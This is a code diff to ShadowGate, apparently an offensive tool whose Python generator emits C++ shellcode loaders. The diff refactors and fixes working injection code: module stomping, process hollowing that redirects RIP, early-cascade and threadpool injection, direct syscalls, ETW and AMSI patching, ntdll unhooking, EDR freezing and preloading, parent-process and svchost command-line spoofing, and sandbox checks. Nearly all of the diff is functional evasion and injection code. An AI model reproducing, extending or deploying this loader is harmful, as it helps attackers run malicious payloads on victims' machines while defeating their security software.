@@ -43,7 +43,7 @@ from .compiler import MSVCCompiler
 # Constants
 # ============================================================================
 
-VERSION = "3.0.0"
+VERSION = "3.1.0"
 CODENAME = "SHADOWGATE"
 
 BANNER = r"""
@@ -90,6 +90,19 @@ def colored(text: str, color: str) -> str:
 class CodeGenerator:
     """Generates C++ source code from templates and configuration"""
     
+    # Shared injection method name → C++ constant mapping
+    INJECT_MAP = {
+        INJECT_STOMP: "INJECT_STOMP",
+        INJECT_EARLYBIRD: "INJECT_EARLYBIRD",
+        INJECT_REMOTETHREAD: "INJECT_REMOTETHREAD",
+        "threadpool": "INJECT_REMOTETHREAD",
+        INJECT_HOLLOWING: "INJECT_HOLLOWING",
+        INJECT_MAPPING: "INJECT_MAPPING",
+        INJECT_THREADPOOL_REAL: "INJECT_THREADPOOL_REAL",
+        INJECT_EARLYCASCADE: "INJECT_EARLYCASCADE",
+        INJECT_CALLBACK: "INJECT_CALLBACK",
+    }
+    
     def __init__(self, config: BuildConfig, base_dir: Path):
         self.config = config
         self.base_dir = base_dir
@@ -98,6 +111,71 @@ class CodeGenerator:
         self.encoder = ShellcodeEncoder()
         self.hasher = HashEngine()
         self.entropy_analyzer = EntropyAnalyzer()
+    
+    def _get_inject_const(self) -> str:
+        """Get the C++ injection method constant for the current config"""
+        return self.INJECT_MAP.get(self.config.inject, "INJECT_STOMP")
+    
+    def _generate_config_defines(self) -> str:
+        """Generate the shared #define configuration block used by all entry points"""
+        inject_const = self._get_inject_const()
+        target_process = self.config.target.replace("\\", "\\\\")
+        
+        return f'''// ============================================================================
+// Build Configuration
+// ============================================================================
+
+#ifndef SYSCALL_METHOD
+#define SYSCALL_METHOD      SYSCALL_{self.config.syscall.upper()}
+#endif
+#ifndef RESOLVER_METHOD
+#define RESOLVER_METHOD     RESOLVER_{self.config.resolver.upper()}
+#endif
+#define INJECTION_METHOD    {inject_const}
+#define TARGET_PROCESS      L"{target_process}"
+#define INITIAL_SLEEP       {self.config.sleep}
+
+#define ENABLE_SANDBOX      {1 if self.config.sandbox else 0}
+#define ENABLE_ETW_PATCH    {1 if self.config.etw else 0}
+#define ENABLE_UNHOOK       {1 if self.config.unhook else 0}
+#define ENABLE_SLEEP_OBF    {1 if self.config.sleep_obfuscation else 0}
+#define ENABLE_AMSI_PATCH   {1 if self.config.amsi else 0}
+#define ENABLE_WIPE_PE      {1 if self.config.wipe_pe else 0}
+#define ENABLE_CALLSTACK_SPOOF {1 if self.config.callstack_spoof else 0}
+#define ENABLE_DYNAPI       {1 if self.config.dynapi else 0}
+#define ENABLE_EDR_FREEZE   {1 if self.config.edr_freeze else 0}
+#define ENABLE_EDR_PRELOAD  {1 if self.config.edr_preload else 0}
+#define ENABLE_FREEZE       {1 if self.config.freeze else 0}
+#define ENABLE_DISABLE_PRELOADED_EDR  {1 if self.config.disable_preloaded_edr else 0}
+#define ENABLE_HOOK_CHECK   {1 if self.config.debug else 0}
+#ifndef DEBUG_BUILD
+#define DEBUG_BUILD         {1 if self.config.debug else 0}
+#endif
+#define ENABLE_CMDLINE_SPOOF {1 if self.config.spoof_cmdline else 0}
+#define SPOOF_CMDLINE_STRING L"C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs"
+#define ENABLE_PPID_SPOOF   {1 if self.config.ppid_spoof else 0}
+#define PPID_SPOOF_TARGET   L"{self.config.ppid_spoof or 'explorer.exe'}"
+#define ENABLE_BLOCK_DLLS   {1 if self.config.block_dlls else 0}
+#define ENABLE_SYSCALL_HASH {1 if self.config.syscall_hash else 0}
+
+// ============================================================================
+// Output Macros
+// ============================================================================
+
+#ifndef LOG_INFO
+#if DEBUG_BUILD
+    #define LOG_INFO(fmt, ...)    printf("[*] " fmt "\\n", ##__VA_ARGS__)
+    #define LOG_SUCCESS(fmt, ...) printf("[+] " fmt "\\n", ##__VA_ARGS__)
+    #define LOG_ERROR(fmt, ...)   printf("[!] " fmt "\\n", ##__VA_ARGS__)
+    #define LOG_PHASE(fmt, ...)   printf("\\n[=] " fmt "\\n", ##__VA_ARGS__)
+#else
+    #define LOG_INFO(fmt, ...)
+    #define LOG_SUCCESS(fmt, ...)
+    #define LOG_ERROR(fmt, ...)
+    #define LOG_PHASE(fmt, ...)
+#endif
+#endif  // LOG_INFO
+'''
     
     def generate(self, shellcode: bytes) -> Dict[str, str]:
         """
@@ -322,21 +400,7 @@ class CodeGenerator:
         """Generate the main.cpp file"""
         
         # Determine injection method constant
-        inject_map = {
-            INJECT_STOMP: "INJECT_STOMP",
-            INJECT_EARLYBIRD: "INJECT_EARLYBIRD",
-            INJECT_REMOTETHREAD: "INJECT_REMOTETHREAD",
-            "threadpool": "INJECT_REMOTETHREAD",
-            INJECT_HOLLOWING: "INJECT_HOLLOWING",
-            INJECT_MAPPING: "INJECT_MAPPING",
-            INJECT_THREADPOOL_REAL: "INJECT_THREADPOOL_REAL",
-            INJECT_EARLYCASCADE: "INJECT_EARLYCASCADE",
-            INJECT_CALLBACK: "INJECT_CALLBACK",
-        }
-        inject_const = inject_map.get(self.config.inject, "INJECT_STOMP")
-        
-        # Generate target process string
-        target_process = self.config.target.replace("\\", "\\\\")
+        config_defines = self._generate_config_defines()
         
         code = f'''/*
  * ============================================================================
@@ -367,6 +431,9 @@ class CodeGenerator:
 #include "resolver.h"
 #include "injection.h"
 #include "evasion.h"
+
+{config_defines}
+
 #if ENABLE_SLEEP_OBF
 #include "sleep_obf.h"
 #endif
@@ -379,53 +446,6 @@ class CodeGenerator:
 #include "earlycascade.h"
 #if ENABLE_EDR_FREEZE
 #include "edr_freeze.h"
-#endif
-
-// ============================================================================
-// Build Configuration
-// ============================================================================
-
-#define SYSCALL_METHOD      SYSCALL_{self.config.syscall.upper()}
-#define RESOLVER_METHOD     RESOLVER_{self.config.resolver.upper()}
-#define INJECTION_METHOD    {inject_const}
-#define TARGET_PROCESS      L"{target_process}"
-#define INITIAL_SLEEP       {self.config.sleep}
-
-#define ENABLE_SANDBOX      {1 if self.config.sandbox else 0}
-#define ENABLE_ETW_PATCH    {1 if self.config.etw else 0}
-#define ENABLE_UNHOOK       {1 if self.config.unhook else 0}
-#define ENABLE_SLEEP_OBF    {1 if self.config.sleep_obfuscation else 0}
-#define ENABLE_AMSI_PATCH   {1 if self.config.amsi else 0}
-#define ENABLE_WIPE_PE      {1 if self.config.wipe_pe else 0}
-#define ENABLE_CALLSTACK_SPOOF {1 if self.config.callstack_spoof else 0}
-#define ENABLE_DYNAPI       {1 if self.config.dynapi else 0}
-#define ENABLE_EDR_FREEZE   {1 if self.config.edr_freeze else 0}
-#define ENABLE_EDR_PRELOAD  {1 if self.config.edr_preload else 0}
-#define ENABLE_FREEZE       {1 if self.config.freeze else 0}
-#define ENABLE_DISABLE_PRELOADED_EDR  {1 if self.config.disable_preloaded_edr else 0}
-#define ENABLE_HOOK_CHECK   {1 if self.config.debug else 0}
-#define DEBUG_BUILD         {1 if self.config.debug else 0}
-#define ENABLE_CMDLINE_SPOOF {1 if self.config.spoof_cmdline else 0}
-#define SPOOF_CMDLINE_STRING L"C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs"
-#define ENABLE_PPID_SPOOF   {1 if self.config.ppid_spoof else 0}
-#define PPID_SPOOF_TARGET   L"{self.config.ppid_spoof or 'explorer.exe'}"
-#define ENABLE_BLOCK_DLLS   {1 if self.config.block_dlls else 0}
-#define ENABLE_SYSCALL_HASH {1 if self.config.syscall_hash else 0}
-
-// ============================================================================
-// Output Macros
-// ============================================================================
-
-#if DEBUG_BUILD
-    #define LOG_INFO(fmt, ...)    printf("[*] " fmt "\\n", ##__VA_ARGS__)
-    #define LOG_SUCCESS(fmt, ...) printf("[+] " fmt "\\n", ##__VA_ARGS__)
-    #define LOG_ERROR(fmt, ...)   printf("[!] " fmt "\\n", ##__VA_ARGS__)
-    #define LOG_PHASE(fmt, ...)   printf("\\n[=] " fmt "\\n", ##__VA_ARGS__)
-#else
-    #define LOG_INFO(fmt, ...)
-    #define LOG_SUCCESS(fmt, ...)
-    #define LOG_ERROR(fmt, ...)
-    #define LOG_PHASE(fmt, ...)
 #endif
 
 // ============================================================================
@@ -491,18 +511,6 @@ int main(int argc, char** argv) {{
     
 #if DEBUG_BUILD
     PrintBanner();
-#endif
-    
-    // ========================================================================
-    // Phase 0a: EDR Preload (Optional)
-    // ========================================================================
-#if ENABLE_EDR_PRELOAD
-    LOG_PHASE("Phase 0a: EDR Preload");
-    if (!PerformEDRPreload()) {{
-        LOG_ERROR("EDR preload failed (continuing anyway)");
-    }} else {{
-        LOG_SUCCESS("EDR preload applied");
-    }}
 #endif
     
     // ========================================================================
@@ -655,6 +663,19 @@ int main(int argc, char** argv) {{
     LOG_SUCCESS("Decrypted %zu bytes", decryptedLen);
     
     // ========================================================================
+    // Phase 7.5: EDR Preload (Optional — applied to OUR process before injection)
+    // Placed here so sandbox/ETW/AMSI checks work normally first.
+    // ========================================================================
+#if ENABLE_EDR_PRELOAD
+    LOG_PHASE("Phase 7.5: EDR Preload");
+    if (!PerformEDRPreload()) {{
+        LOG_ERROR("EDR preload failed (continuing anyway)");
+    }} else {{
+        LOG_SUCCESS("EDR preload applied");
+    }}
+#endif
+    
+    // ========================================================================
     // Phase 8: Shellcode Injection
     // ========================================================================
     LOG_PHASE("Phase 8: Shellcode Injection");
@@ -671,7 +692,8 @@ int main(int argc, char** argv) {{
 #endif
     
     if (!PerformInjection(&ctx)) {{
-        LOG_ERROR("Injection failed");
+        printf("[!] Injection failed\\n");
+        fflush(stdout);
         VirtualFree(pDecrypted, 0, MEM_RELEASE);
         return -1;
     }}
@@ -755,6 +777,26 @@ int main(int argc, char** argv) {{
 #include "resolver.h"
 #include "injection.h"
 #include "evasion.h"
+
+// ============================================================================
+// Build Configuration
+// ============================================================================
+
+#ifndef SYSCALL_METHOD
+#define SYSCALL_METHOD      SYSCALL_{self.config.syscall.upper()}
+#endif
+#ifndef RESOLVER_METHOD
+#define RESOLVER_METHOD     RESOLVER_{self.config.resolver.upper()}
+#endif
+#define INJECTION_METHOD    {inject_const}
+#define TARGET_PROCESS      L"{target_process}"
+#define INITIAL_SLEEP       {self.config.sleep}
+
+#define ENABLE_SANDBOX      {1 if self.config.sandbox else 0}
+#define ENABLE_ETW_PATCH    {1 if self.config.etw else 0}
+#define ENABLE_UNHOOK       {1 if self.config.unhook else 0}
+#define ENABLE_SLEEP_OBF    {1 if self.config.sleep_obfuscation else 0}
+
 #if ENABLE_SLEEP_OBF
 #include "sleep_obf.h"
 #endif
@@ -768,21 +810,6 @@ int main(int argc, char** argv) {{
 #if ENABLE_EDR_FREEZE
 #include "edr_freeze.h"
 #endif
-
-// ============================================================================
-// Build Configuration
-// ============================================================================
-
-#define SYSCALL_METHOD      SYSCALL_{self.config.syscall.upper()}
-#define RESOLVER_METHOD     RESOLVER_{self.config.resolver.upper()}
-#define INJECTION_METHOD    {inject_const}
-#define TARGET_PROCESS      L"{target_process}"
-#define INITIAL_SLEEP       {self.config.sleep}
-
-#define ENABLE_SANDBOX      {1 if self.config.sandbox else 0}
-#define ENABLE_ETW_PATCH    {1 if self.config.etw else 0}
-#define ENABLE_UNHOOK       {1 if self.config.unhook else 0}
-#define ENABLE_SLEEP_OBF    {1 if self.config.sleep_obfuscation else 0}
 #define ENABLE_AMSI_PATCH   {1 if self.config.amsi else 0}
 #define ENABLE_WIPE_PE      {1 if self.config.wipe_pe else 0}
 #define ENABLE_CALLSTACK_SPOOF {1 if self.config.callstack_spoof else 0}
@@ -792,7 +819,9 @@ int main(int argc, char** argv) {{
 #define ENABLE_FREEZE       {1 if self.config.freeze else 0}
 #define ENABLE_DISABLE_PRELOADED_EDR  {1 if self.config.disable_preloaded_edr else 0}
 #define ENABLE_HOOK_CHECK   {1 if self.config.debug else 0}
+#ifndef DEBUG_BUILD
 #define DEBUG_BUILD         {1 if self.config.debug else 0}
+#endif
 #define ENABLE_CMDLINE_SPOOF {1 if self.config.spoof_cmdline else 0}
 #define SPOOF_CMDLINE_STRING L"C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs"
 #define ENABLE_PPID_SPOOF   {1 if self.config.ppid_spoof else 0}
@@ -804,6 +833,7 @@ int main(int argc, char** argv) {{
 // Output Macros
 // ============================================================================
 
+#ifndef LOG_INFO
 #if DEBUG_BUILD
     #define LOG_INFO(fmt, ...)    printf("[*] " fmt "\\n", ##__VA_ARGS__)
     #define LOG_SUCCESS(fmt, ...) printf("[+] " fmt "\\n", ##__VA_ARGS__)
@@ -815,6 +845,7 @@ int main(int argc, char** argv) {{
     #define LOG_ERROR(fmt, ...)
     #define LOG_PHASE(fmt, ...)
 #endif
+#endif  // LOG_INFO
 
 // ============================================================================
 // API Hashes
@@ -980,7 +1011,8 @@ static DWORD WINAPI PayloadThread(LPVOID lpParam) {{
     ctx.dwInjectionMethod = INJECTION_METHOD;
 
     if (!PerformInjection(&ctx)) {{
-        LOG_ERROR("Injection failed");
+        printf("[!] Injection failed\\n");
+        fflush(stdout);
         VirtualFree(pDecrypted, 0, MEM_RELEASE);
         return 1;
     }}
@@ -1075,26 +1107,17 @@ __declspec(dllexport) void Run(void) {{
 #include "resolver.h"
 #include "injection.h"
 #include "evasion.h"
-#if ENABLE_SLEEP_OBF
-#include "sleep_obf.h"
-#endif
-#if ENABLE_CALLSTACK_SPOOF
-#include "callstack.h"
-#endif
-#if ENABLE_DYNAPI
-#include "dynapi.h"
-#endif
-#include "earlycascade.h"
-#if ENABLE_EDR_FREEZE
-#include "edr_freeze.h"
-#endif
 
 // ============================================================================
 // Build Configuration
 // ============================================================================
 
+#ifndef SYSCALL_METHOD
 #define SYSCALL_METHOD      SYSCALL_{self.config.syscall.upper()}
+#endif
+#ifndef RESOLVER_METHOD
 #define RESOLVER_METHOD     RESOLVER_{self.config.resolver.upper()}
+#endif
 #define INJECTION_METHOD    {inject_const}
 #define TARGET_PROCESS      L"{target_process}"
 #define INITIAL_SLEEP       {self.config.sleep}
@@ -1113,9 +1136,25 @@ __declspec(dllexport) void Run(void) {{
 #define ENABLE_FREEZE       {1 if self.config.freeze else 0}
 #define ENABLE_DISABLE_PRELOADED_EDR  {1 if self.config.disable_preloaded_edr else 0}
 #define ENABLE_HOOK_CHECK   {1 if self.config.debug else 0}
+#ifndef DEBUG_BUILD
 #define DEBUG_BUILD         {1 if self.config.debug else 0}
+#endif
 #define ENABLE_CMDLINE_SPOOF {1 if self.config.spoof_cmdline else 0}
 #define SPOOF_CMDLINE_STRING L"C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs"
+
+#if ENABLE_SLEEP_OBF
+#include "sleep_obf.h"
+#endif
+#if ENABLE_CALLSTACK_SPOOF
+#include "callstack.h"
+#endif
+#if ENABLE_DYNAPI
+#include "dynapi.h"
+#endif
+#include "earlycascade.h"
+#if ENABLE_EDR_FREEZE
+#include "edr_freeze.h"
+#endif
 #define ENABLE_PPID_SPOOF   {1 if self.config.ppid_spoof else 0}
 #define PPID_SPOOF_TARGET   L"{self.config.ppid_spoof or 'explorer.exe'}"
 #define ENABLE_BLOCK_DLLS   {1 if self.config.block_dlls else 0}
@@ -1125,6 +1164,7 @@ __declspec(dllexport) void Run(void) {{
 // Output Macros
 // ============================================================================
 
+#ifndef LOG_INFO
 #if DEBUG_BUILD
     #define LOG_INFO(fmt, ...)    printf("[*] " fmt "\\n", ##__VA_ARGS__)
     #define LOG_SUCCESS(fmt, ...) printf("[+] " fmt "\\n", ##__VA_ARGS__)
@@ -1136,6 +1176,7 @@ __declspec(dllexport) void Run(void) {{
     #define LOG_ERROR(fmt, ...)
     #define LOG_PHASE(fmt, ...)
 #endif
+#endif  // LOG_INFO
 
 // ============================================================================
 // API Hashes
@@ -1301,7 +1342,8 @@ static DWORD WINAPI PayloadThread(LPVOID lpParam) {{
     ctx.dwInjectionMethod = INJECTION_METHOD;
 
     if (!PerformInjection(&ctx)) {{
-        LOG_ERROR("Injection failed");
+        printf("[!] Injection failed\\n");
+        fflush(stdout);
         VirtualFree(pDecrypted, 0, MEM_RELEASE);
         return 1;
     }}
@@ -1758,6 +1800,13 @@ NTSTATUS NtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress) {
     return ((fn_NtUnmapViewOfSection)DoSyscall)(ProcessHandle, BaseAddress);
 }
 
+typedef NTSTATUS (NTAPI *fn_NtSuspendProcess)(HANDLE);
+
+NTSTATUS NtSuspendProcess(HANDLE ProcessHandle) {
+    PrepareNextSyscall(IDX_NtSuspendProcess);
+    return ((fn_NtSuspendProcess)DoSyscall)(ProcessHandle);
+}
+
 typedef NTSTATUS (NTAPI *fn_NtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
 
 NTSTATUS NtQuerySystemInformation(ULONG InfoClass, PVOID Buffer, ULONG Length, PULONG ReturnLength) {
@@ -1955,50 +2004,6 @@ DoSyscall PROC
     mov r10, rcx
     mov eax, wCurrentSSN
     jmp qword ptr [qSyscallAddr]
-DoSyscall ENDP
-
-END
-'''
-    
-    def _generate_direct_syscalls_asm(self) -> str:
-        """Generate direct syscall assembly (Hell's Gate style)"""
-        return '''; ============================================================================
-; ShadowGate - Direct Syscall Assembly (Hell's Gate Style)
-; ============================================================================
-
-.data
-    wCurrentSSN     DWORD 0
-    qSyscallAddr    QWORD 0
-
-.code
-
-; ============================================================================
-; SetSSN - Set System Service Number
-; ============================================================================
-SetSSN PROC
-    mov wCurrentSSN, ecx
-    ret
-SetSSN ENDP
-
-; ============================================================================
-; PrepareSyscall - Prepare SSN and syscall address
-; RCX = SSN
-; RDX = Address (not used in direct mode, but kept for compatibility)
-; ============================================================================
-PrepareSyscall PROC
-    mov wCurrentSSN, ecx
-    mov qSyscallAddr, rdx
-    ret
-PrepareSyscall ENDP
-
-; ============================================================================
-; DoSyscall - Execute direct syscall
-; ============================================================================
-DoSyscall PROC
-    mov r10, rcx
-    mov eax, wCurrentSSN
-    syscall
-    ret
 DoSyscall ENDP
 
 END
@@ -2257,18 +2262,47 @@ PVOID GetNtdllFromPEB(VOID) {{
 }}
 
 PVOID GetFreshNtdll(VOID) {{
-    // Build path to ntdll.dll on disk
-    WCHAR wszNtdllPath[MAX_PATH] = {{ 0 }};
-    GetSystemDirectoryW(wszNtdllPath, MAX_PATH);
-    lstrcatW(wszNtdllPath, L"\\\\ntdll.dll");
+    // Build path to ntdll.dll using SharedUserData->NtSystemRoot
+    // This is stable across all Windows x64 versions: 0x7FFE0000 + 0x030
+    // NtSystemRoot is a WCHAR[260] containing e.g. "C:\\Windows"
+    WCHAR* pSystemRoot = (WCHAR*)(0x7FFE0000 + 0x030);
+    if (!pSystemRoot || pSystemRoot[0] == 0) {{
+#if DEBUG_BUILD
+        LOG_ERROR("GetFreshNtdll: SharedUserData NtSystemRoot is empty");
+#endif
+        return NULL;
+    }}
 
-    // Build NT path: \\?\\C:\\Windows\\System32\\ntdll.dll
-    WCHAR wszNtPath[MAX_PATH + 8] = L"\\\\??\\\\";
-    lstrcatW(wszNtPath, wszNtdllPath);
+    // Build NT path: "\\??\\C:\\Windows\\System32\\ntdll.dll"
+    WCHAR wszNtPath[MAX_PATH + 8] = {{ 0 }};
+    DWORD idx = 0;
+
+    // Prefix "\\?\\"
+    wszNtPath[idx++] = L'\\\\';
+    wszNtPath[idx++] = L'?';
+    wszNtPath[idx++] = L'?';
+    wszNtPath[idx++] = L'\\\\';
+
+    // Copy NtSystemRoot (e.g. "C:\\Windows")
+    for (DWORD i = 0; pSystemRoot[i] != 0 && idx < MAX_PATH; i++) {{
+        wszNtPath[idx++] = pSystemRoot[i];
+    }}
+
+    // Append "\\System32\\ntdll.dll" char by char (avoids string literal issues)
+    static const WCHAR suffix[] = {{ L'\\\\', L'S', L'y', L's', L't', L'e', L'm', L'3', L'2',
+                                     L'\\\\', L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', 0 }};
+    for (DWORD i = 0; suffix[i] != 0 && idx < MAX_PATH + 6; i++) {{
+        wszNtPath[idx++] = suffix[i];
+    }}
+    wszNtPath[idx] = 0;
+
+#if DEBUG_BUILD
+    LOG_INFO("GetFreshNtdll: Path = %ls", wszNtPath);
+#endif
 
     UNICODE_STRING ustrPath;
     ustrPath.Buffer = wszNtPath;
-    ustrPath.Length = (USHORT)(lstrlenW(wszNtPath) * sizeof(WCHAR));
+    ustrPath.Length = (USHORT)(idx * sizeof(WCHAR));
     ustrPath.MaximumLength = ustrPath.Length + sizeof(WCHAR);
 
     OBJECT_ATTRIBUTES oa = {{ 0 }};
@@ -2630,6 +2664,31 @@ extern "C" void PrepareNextSyscall(DWORD dwIndex);
 #define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000ULL
 #endif
 
+// Fallback definitions in case these are not defined via main.cpp include
+#ifndef SPOOF_CMDLINE_STRING
+#define SPOOF_CMDLINE_STRING L"C:\\Windows\\System32\\svchost.exe -k netsvcs"
+#endif
+
+#ifndef PPID_SPOOF_TARGET
+#define PPID_SPOOF_TARGET L"explorer.exe"
+#endif
+
+#ifndef ENABLE_CMDLINE_SPOOF
+#define ENABLE_CMDLINE_SPOOF 0
+#endif
+
+#ifndef ENABLE_PPID_SPOOF
+#define ENABLE_PPID_SPOOF 0
+#endif
+
+#ifndef ENABLE_BLOCK_DLLS
+#define ENABLE_BLOCK_DLLS 0
+#endif
+
+#ifndef ENABLE_FREEZE
+#define ENABLE_FREEZE 0
+#endif
+
 // ============================================================================
 // Helper: Find Process by Name
 // ============================================================================
@@ -2673,18 +2732,56 @@ BOOL ExecuteViaCallback(PVOID pShellcode) {
 BOOL InjectModuleStomp(PINJECTION_CONTEXT pCtx) {
 #if DEBUG_BUILD
     LOG_INFO("Module Stomping: Loading sacrificial DLL...");
+    LOG_INFO("Module Stomping: Shellcode size = %zu bytes", pCtx->dwShellcodeSize);
 #endif
     
-    HMODULE hModule = LoadLibraryA("colorui.dll");
-    if (!hModule) {
-        hModule = LoadLibraryA("msftedit.dll");
+    // Try DLLs from largest .text to smallest; the shellcode must fit
+    const char* dlls[] = {
+        "dbghelp.dll",       // ~1.0 MB .text
+        "urlmon.dll",        // ~500 KB .text
+        "mshtml.dll",        // very large if present
+        "xpsservices.dll",   // ~200 KB .text
+        "msftedit.dll",      // ~300 KB .text
+        "colorui.dll",       // ~60 KB .text
+        NULL
+    };
+    
+    HMODULE hModule = NULL;
+    for (int d = 0; dlls[d] != NULL; d++) {
+        hModule = LoadLibraryA(dlls[d]);
+        if (hModule) {
+#if DEBUG_BUILD
+            LOG_INFO("Module Stomping: Loaded %s @ 0x%p", dlls[d], hModule);
+#endif
+            // Check if .text is big enough
+            PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
+            PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDos->e_lfanew);
+            PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
+            BOOL bFound = FALSE;
+            for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+                if (strncmp((char*)pSec[i].Name, ".text", 5) == 0) {
+                    if (pSec[i].Misc.VirtualSize >= pCtx->dwShellcodeSize) {
+                        bFound = TRUE;
+#if DEBUG_BUILD
+                        LOG_INFO("Module Stomping: %s .text = %lu bytes (sufficient)", dlls[d], pSec[i].Misc.VirtualSize);
+#endif
+                    } else {
+#if DEBUG_BUILD
+                        LOG_INFO("Module Stomping: %s .text = %lu bytes (too small, need %zu)", dlls[d], pSec[i].Misc.VirtualSize, pCtx->dwShellcodeSize);
+#endif
+                    }
+                    break;
+                }
+            }
+            if (bFound) break;
+            FreeLibrary(hModule);
+            hModule = NULL;
+        }
     }
-    if (!hModule) {
-        hModule = LoadLibraryA("xpsservices.dll");
-    }
+    
     if (!hModule) {
 #if DEBUG_BUILD
-        LOG_ERROR("Failed to load sacrificial DLL");
+        LOG_ERROR("Module Stomping: No sacrificial DLL with .text >= %zu bytes", pCtx->dwShellcodeSize);
 #endif
         return FALSE;
     }
@@ -2707,7 +2804,7 @@ BOOL InjectModuleStomp(PINJECTION_CONTEXT pCtx) {
     
     if (!pTextSection || pCtx->dwShellcodeSize > dwTextSize) {
 #if DEBUG_BUILD
-        LOG_ERROR("Text section not found or too small");
+        LOG_ERROR("Text section not found or too small (have %lu, need %zu)", dwTextSize, pCtx->dwShellcodeSize);
 #endif
         return FALSE;
     }
@@ -3148,7 +3245,12 @@ BOOL InjectProcessHollowing(PINJECTION_CONTEXT pCtx) {
     PrepareNextSyscall(IDX_NtProtectVirtualMemory);
     NtProtectVirtualMemory(pi.hProcess, &pAddr, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
     
-    ctx.Rcx = (DWORD64)pRemoteBase;
+    // Redirect execution to our shellcode by setting RIP (instruction pointer)
+    ctx.Rip = (DWORD64)pRemoteBase;
+    
+#if DEBUG_BUILD
+    LOG_INFO("Process Hollowing: Redirecting RIP to 0x%p", pRemoteBase);
+#endif
     
     if (!SetThreadContext(pi.hThread, &ctx)) {
 #if DEBUG_BUILD
@@ -3360,8 +3462,17 @@ BOOL InjectThreadPoolReal(PINJECTION_CONTEXT pCtx) {
     // No new thread is created; the existing thread pool worker picks it up
     _TpPostWork(pWork);
     
-    // Wait for execution (the thread pool worker will execute it)
-    Sleep(1000);
+    // Wait for the work callback to complete using the proper TP API
+    // WaitForThreadpoolWorkCallbacks is in kernel32 and waits until the callback finishes
+    typedef VOID (WINAPI* fn_WaitForTPWorkCallbacks)(PTP_WORK, BOOL);
+    fn_WaitForTPWorkCallbacks _WaitForTP = (fn_WaitForTPWorkCallbacks)GetProcAddress(
+        GetModuleHandleA("kernel32.dll"), "WaitForThreadpoolWorkCallbacks");
+    if (_WaitForTP) {
+        _WaitForTP(pWork, FALSE);
+    } else {
+        // Fallback: sleep and hope for the best
+        Sleep(5000);
+    }
     
     // Cleanup
     _TpReleaseWork(pWork);
@@ -3632,6 +3743,7 @@ BOOL PerformInjection(PINJECTION_CONTEXT pCtx) {
 #include <windows.h>
 #include "common.h"
 #include "syscalls.h"
+#include "resolver.h"
 #include "injection.h"
 
 #ifdef __cplusplus
@@ -3641,18 +3753,17 @@ extern "C" {
 // Pattern scanning
 LPVOID FindPattern(LPBYTE pBuffer, DWORD dwSize, LPBYTE pPattern, DWORD dwPatternSize);
 
+// Section helpers
+ULONG_PTR GetNtdllSectionBase(ULONG_PTR baseAddress, const char* name);
+
 // Shim Engine callback locators
 LPVOID FindSE_DllLoadedAddress(LPVOID hNtDLL, LPVOID *ppOffsetAddress);
 LPVOID FindShimsEnabledAddress(LPVOID hNtDLL, LPVOID pDllLoadedOffsetAddress);
 
-// AppVerifier fallback (from MalwareTech EDR-Preloader research)
-ULONG_PTR FindAvrfpAddress(ULONG_PTR mrdataBase);
-ULONG_PTR GetNtdllSectionBase(ULONG_PTR baseAddress, const char* name);
-
 // Pointer encoding using SharedUserData!Cookie
 LPVOID EncodeSystemPtr(LPVOID ptr);
 
-// Hook integrity check
+// Hook integrity check (called from main.cpp when ENABLE_HOOK_CHECK=1)
 BOOL VerifyNoHooks(VOID);
 
 // Main injection
@@ -3666,13 +3777,70 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx);
 
         files['earlycascade.cpp'] = r'''/*
  * ShadowGate - Early Cascade Injection
- * Shim Engine g_pfnSE_DllLoaded hijack with AppVerifier AvrfpAPILookupCallbackRoutine fallback
- * Based on 0xNinjaCyclone/EarlyCascade and MalwareTech EDR-Preloader research
+ * Shim Engine g_pfnSE_DllLoaded hijack
+ * Based on 0xNinjaCyclone/EarlyCascade reference implementation
  */
 
 #include "earlycascade.h"
 #include <stdio.h>
 #include <intrin.h>
+#include <string.h>
+#include <tlhelp32.h>
+
+// Forward declarations from injection.cpp (for PPID spoof / cmdline spoof)
+extern "C" HANDLE GetSpoofParentHandle(LPCWSTR wszParentName);
+extern "C" BOOL SpoofRemoteCommandLine(HANDLE hProcess);
+
+// Early Cascade diagnostics (conditional on DEBUG_BUILD)
+#ifndef DEBUG_BUILD
+#define DEBUG_BUILD 0
+#endif
+
+#if DEBUG_BUILD
+#define LOG_EC(fmt, ...) do { printf("[EarlyCascade] " fmt "\\n", ##__VA_ARGS__); fflush(stdout); } while(0)
+#else
+#define LOG_EC(fmt, ...) ((void)0)
+#endif
+
+#ifndef LOG_ERROR
+#if DEBUG_BUILD
+    #define LOG_ERROR(fmt, ...)   printf("[!] " fmt "\\n", ##__VA_ARGS__)
+    #define LOG_INFO(fmt, ...)    printf("[*] " fmt "\\n", ##__VA_ARGS__)
+    #define LOG_SUCCESS(fmt, ...) printf("[+] " fmt "\\n", ##__VA_ARGS__)
+#else
+    #define LOG_ERROR(fmt, ...)
+    #define LOG_INFO(fmt, ...)
+    #define LOG_SUCCESS(fmt, ...)
+#endif
+#endif
+
+#ifndef ENABLE_PPID_SPOOF
+#define ENABLE_PPID_SPOOF 0
+#endif
+
+#ifndef ENABLE_BLOCK_DLLS
+#define ENABLE_BLOCK_DLLS 0
+#endif
+
+#ifndef PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
+#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000ULL
+#endif
+
+#ifndef PPID_SPOOF_TARGET
+#define PPID_SPOOF_TARGET L"explorer.exe"
+#endif
+
+#ifndef ENABLE_CMDLINE_SPOOF
+#define ENABLE_CMDLINE_SPOOF 0
+#endif
+
+#ifndef SPOOF_CMDLINE_STRING
+#define SPOOF_CMDLINE_STRING L"C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs"
+#endif
